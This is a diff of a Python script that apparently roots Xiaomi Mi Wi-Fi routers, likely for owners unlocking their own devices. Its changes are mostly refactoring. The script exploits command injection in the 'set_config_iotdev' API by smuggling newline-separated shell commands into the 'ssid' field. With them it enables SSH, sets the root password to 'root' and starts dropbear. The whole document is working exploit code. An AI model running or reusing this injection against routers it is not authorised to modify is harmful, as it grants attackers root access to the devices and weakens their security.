@@ -25,7 +25,7 @@ from gateway import *
 
 gw = Gateway(timeout = 4, detect_ssh = False)
 if gw.status < 1:
-  die("Xiaomi Mi Wi-Fi device not found (IP: {})".format(gw.ip_addr))
+    die("Xiaomi Mi Wi-Fi device not found (IP: {})".format(gw.ip_addr))
 
 print("device_name =", gw.device_name)
 print("rom_version = {} {}".format(gw.rom_version, gw.rom_channel))
@@ -35,20 +35,19 @@ dn = gw.device_name
 gw.ssh_port = 22
 ret = gw.detect_ssh(verbose = 1, interactive = True)
 if ret > 0:
-  die(0, "SSH server already installed and running")
+    die(0, "SSH server already installed and running")
 
 stok = gw.web_login()
-ext_name = 'misystem/set_config_iotdev'
-user_id = '_username_'
 
-def exec_cmd(cmd):
-  params = { 'bssid': 'Xiaomi', 'user_id': user_id, 'ssid': ('-h' + '\n' + cmd + '\n') }
-  res = requests.get(gw.apiurl + ext_name, params = params)
-  return res.text
+
+def exec_cmd(cmd, api = 'API/misystem/set_config_iotdev'):
+    params = { 'bssid': 'Xiaomi', 'user_id': '_username_', 'ssid': ('-h' + '\n' + cmd + '\n') }
+    resp = gw.api_request(api, params)
+    return resp
 
 res = exec_cmd('nvram set bootdelay=3; set boot_wait=on; nvram set ssh_en=1; nvram commit;')
-if res != '{"code":0}':
-  die('Extension "/api/{}" not working!'.format(ext_name))
+if not res or int(res['code']) != 0:
+    die('Exploit "set_config_iotdev" not working!')
 
 cmd = ''
 cmd += 'echo -e "root\\nroot" | passwd root' + '\n'
@@ -58,8 +57,8 @@ cmd += "/etc/init.d/dropbear enable" + '\n'
 cmd += "/etc/init.d/dropbear restart" + '\n'
 cmd += 'logger -p err -t XMiR "completed!"' + '\n'
 res = exec_cmd(cmd)
-#if res != '{"code":0}':
-#  die('Extension "/api/misystem/set_config_iotdev" not working!!!')
+#if not res or int(res['code']) != 0:
+#    die('Exploit "set_config_iotdev" not working!!!')
 
 time.sleep(0.5)
 gw.passw = 'root'
